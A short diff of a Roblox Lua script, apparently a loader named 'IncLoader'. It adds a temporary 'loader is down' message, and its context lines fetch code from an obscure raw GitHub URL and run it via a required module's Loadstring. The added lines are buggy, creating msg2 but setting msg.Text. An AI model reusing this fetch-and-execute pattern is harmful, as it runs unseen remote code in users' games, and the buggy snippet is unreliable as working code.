@@ -1,3 +1,6 @@
+msg2=Instance.new("Message",workspace) msg.Text="IncLoader is currently down! it just stop working for some unknow reason im trying fix it right now"
+wait(5)
+msg2:Remove()
 local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
 require(8082203830):Loadstring(Source)
 local success, error = pcall(function()
